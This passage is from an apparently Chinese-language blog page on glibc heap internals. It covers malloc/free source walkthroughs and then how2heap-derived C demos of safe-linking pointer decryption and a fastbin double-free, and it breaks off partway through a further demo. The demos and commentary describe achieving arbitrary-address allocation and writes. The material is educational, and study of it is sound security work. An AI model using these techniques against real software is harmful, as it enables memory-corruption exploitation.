class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br></pre></td></tr></table></figure><p>最后便是如果大小不再fastbin中，并且是mmaped来的，进入到了最后的else分支逻辑，调用<code>munmap_chunk</code>进行释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>free的操作相较于malloc要简单很多，概括来说就是这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">_int_free</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    视tcache情况，如果<span class="built_in">free</span>的chunk大小合适，tcache bin没满，则放到tcache bin 里</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span>(大小满足fastbin范围)</span><br><span class="line">        &#123;</span><br><span class="line">            检查、放进fastbin里</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(chunk不是mmap得来的)</span><br><span class="line">        &#123;</span><br><span class="line">            检查</span><br><span class="line">            进行chunk的前向与后向合并。</span><br><span class="line">                <span class="keyword">if</span>(后向chunk不是top chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    判断是否合并</span><br><span class="line">                    然后把合并后的chunk放进unsorted bin中</span><br><span class="line">                &#125;<span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    top chunk扩展</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(size足够大)</span><br><span class="line">            &#123;</span><br><span class="line">                调用malloc_consolidate进行fastbin合并整理</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            mummap_chunk(p)</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h4 id="初始化操作"><a href="#初始化操作" class="headerlink" title="初始化操作"></a>初始化操作</h4><p><code>ptmalloc_init</code>函数大致流程如下(只保留了关键部分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">ptmalloc_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  __malloc_initialized = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize (); <span class="comment">//初始化tcache_key</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> USE_MTAG</span></span><br><span class="line">  <span class="keyword">if</span> ((TUNABLE_GET_FULL (glibc, mem, tagging, <span class="keyword">int32_t</span>, <span class="literal">NULL</span>) &amp; <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If the tunable says that we should be using tagged memory</span></span><br><span class="line"><span class="comment"> and that morecore does not support tagged regions, then</span></span><br><span class="line"><span class="comment"> disable it.  */</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined SHARED &amp;&amp; IS_IN (libc)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__libc_initial)</span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  thread_arena = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  malloc_init_state (&amp;main_arena);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">/* Force mmap for main arena instead of sbrk, so hugepages are explicitly</span></span><br><span class="line"><span class="comment">       used.  */</span></span><br><span class="line">    __always_fail_morecore = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (_environ != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是一个Tcache 的key初始化操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  tcache_key_initialize ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这个函数我们在之前分析tcache的宏的时候分析过,比较简单，根据字长获取一个32位/64位的随机数存放在<code>tcache_key</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有就是对<code>main_arena</code>进行初始化的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_init_state (&amp;main_arena);</span><br></pre></td></tr></table></figure><p>这个函数定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_init_state (mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125; <span class="comment">//初始化av对应的bins，bins中的每个bin对应的双向链表初始化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST); <span class="comment">//设置fastbin，这个宏在之前整理fastbin相关的宏的时候整理过</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);<span class="comment">//设置top_chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="各种攻击方式-选自how2heap以及零散整理"><a href="#各种攻击方式-选自how2heap以及零散整理" class="headerlink" title="各种攻击方式(选自how2heap以及零散整理)"></a>各种攻击方式(选自how2heap以及零散整理)</h1><p>在利用的过程中，我们也会对分配的思路有进一步的理解与熟悉。learn by hack。</p><h2 id="decrypt-safe-linking"><a href="#decrypt-safe-linking" class="headerlink" title="decrypt_safe_linking"></a>decrypt_safe_linking</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">long</span> cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;because of the 12bit sliding.&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;</span>);</span><br><span class="line"><span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> plain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> bits = <span class="number">64</span><span class="number">-12</span>*i;</span><br><span class="line"><span class="keyword">if</span>(bits &lt; <span class="number">0</span>) bits = <span class="number">0</span>;</span><br><span class="line">plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;</span><br><span class="line">key = plain &gt;&gt; <span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;round %d:\n&quot;</span>, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;key:    %#016lx\n&quot;</span>, key);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;plain:  %#016lx\n&quot;</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;cipher: %#016lx\n\n&quot;</span>, cipher);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> plain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This technique demonstrates how to recover the original content from a poisoned</span></span><br><span class="line"><span class="comment"> * value because of the safe-linking mechanism.</span></span><br><span class="line"><span class="comment"> * The attack uses the fact that the first 12 bit of the plaintext (pointer) is known</span></span><br><span class="line"><span class="comment"> * and the key (ASLR slide) is the same to the pointer&#x27;s leading bits.</span></span><br><span class="line"><span class="comment"> * As a result, as long as the chunk where the pointer is stored is at the same page</span></span><br><span class="line"><span class="comment"> * of the pointer itself, the value of the pointer can be fully recovered.</span></span><br><span class="line"><span class="comment"> * Otherwise, we can also recover the pointer with the page-offset between the storer</span></span><br><span class="line"><span class="comment"> * and the pointer. What we demonstrate here is a special case whose page-offset is 0. </span></span><br><span class="line"><span class="comment"> * For demonstrations of other more general cases, plz refer to </span></span><br><span class="line"><span class="comment"> * https://github.com/n132/Dec-Safe-Linking</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 1: allocate chunks</span></span><br><span class="line"><span class="keyword">long</span> *a = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">long</span> *b = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;First, we create chunk a @ %p and chunk b @ %p\n&quot;</span>, a, b);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;And then create a padding chunk to prevent consolidation.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// step 2: free chunks</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now free chunk a and then free chunk b.&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the freelist is: [%p -&gt; %p]\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Due to safe-linking, the value actually stored at b[0] is: %#lx\n&quot;</span>, b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// step 3: recover the values</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now decrypt the poisoned value&quot;</span>);</span><br><span class="line"><span class="keyword">long</span> plaintext = decrypt(b[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;value: %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;recovered value: %#lx\n&quot;</span>, plaintext);</span><br><span class="line">assert(plaintext == (<span class="keyword">long</span>)a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个恢复过程有点像密码学中MT19937的过程。</p><p>我们知道在<code>tcache bin</code>以及<code>fastbin</code>里面对单向链表的指针域进行了一个加密的操作,其加密过程是这样的</p><script type="math/tex; mode=display">CipherPtr=(pos>>12)\oplus Ptr</script><p>其中<code>Ptr</code>是指向的下一个堆块地址，而<code>pos</code>是当前堆块的地址。</p><p>如果我们能求出($pos&gt;&gt;12$)，那么就能恢复出$Ptr$</p><p>但是我们注意到一点就是，在分配的chunk不多的情况下，下一个堆块的地址和当前堆块的地址 的高12位一定是一样的(因为在一个页面里面)</p><p>所以</p><script type="math/tex; mode=display">CipherPtr=(pos>>12)\oplus Ptr=(Ptr>>12)\oplus Ptr</script><p>而$Ptr&gt;&gt;12$的高12位为0，所以$CipherPtr$的高12位就是$Ptr$的高12位。求出了$Ptr$的高12位我们也就求出了$Ptr&gt;&gt;12$的前24位，进而求出了$Ptr$的24位，依此类推就能将$Ptr$全部还原</p><p>(当然这也有局限性，两个堆块必须在同一页面才行，否则可能需要一点点爆破或者干脆求不出来)</p><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个应该是一个入门级的利用了</p><p>由于tcache bin不满的情况下free的堆块会先放进tcache bin中，所以先把tcache bin填满(一般最多7个就行了)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line"><span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后分配三个chunk:a、b、c，先<code>free</code>掉a，再<code>free</code>掉b，fastbin中就会形成b—&gt;a的链表，然后再<code>free</code>掉a,就有a—&gt;b—&gt;a的情况</p><p>这样我们有两种思路，一种就是连续申请三次，就会得到指向相同块的两个指针，还有便是申请一次得到a之后修改指向，实现任意地址申请，如果有edit等函数的话便能实现任意地址写之类的。</p><p>其实以前的tcache bin也能达到这个效果，但是如果认真读代码的话你会发现在free的时候对整个链表进行了检查，如果能通过UAF修改key的话应该能绕过。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span 